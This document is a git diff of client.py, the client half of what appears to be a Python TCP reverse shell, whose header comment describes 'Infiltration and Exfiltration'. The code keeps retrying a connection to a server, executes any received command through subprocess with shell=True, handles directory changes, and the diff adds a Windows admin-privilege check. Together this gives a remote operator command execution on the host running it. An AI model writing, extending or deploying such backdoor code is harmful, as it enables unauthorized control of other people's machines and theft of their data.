@@ -1,3 +1,9 @@
+# client.py
+# Works on Transmission Control Protocol (TCP)
+# Keeps tuning to establish the connection with Server
+# Change directory (executed 'cd' shell command)
+# TCP bi-directional data transfer (Infiltration and Exfiltration)-CLIENT
+
 import socket
 import subprocess
 import os
@@ -16,6 +22,14 @@ def tuneConnection():
 
         except:
             tuneConnection()
+
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() !=0
+    except:
+        return False
+
 
 def shell(mySocket):
     while True:
@@ -40,14 +54,12 @@ def shell(mySocket):
                 informToServer = "[+] Some error occured. " + str(e)
                 mySocket.send(informToServer.encode())
 
-        elif "checkPrivilege" in command:
-            try:
-                admin = 'admin' in os.popen('whoami /groups').read().lower() if sys.platform.startswith(
-                    "win") else os.geteuid() == 0
-                privilege = b"[+] Administrator Privileges." if admin else b"[+] User Privileges. (No Admin privileges)"
-                mySocket.send(privilege.encode())
-            except Exception as e:
-                mySocket.send(f"[+] Some Error Occurred: {str(e)}".encode())
+
+        elif "checkPrivilege" in command.decode():
+            if is_admin():
+                mySocket.send(b"[+] Running with Admin Privileges\n")
+            else:
+                mySocket.send(b"[+] User Privileges. (No Admin Privileges)\n")
 
         else:
             CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE,
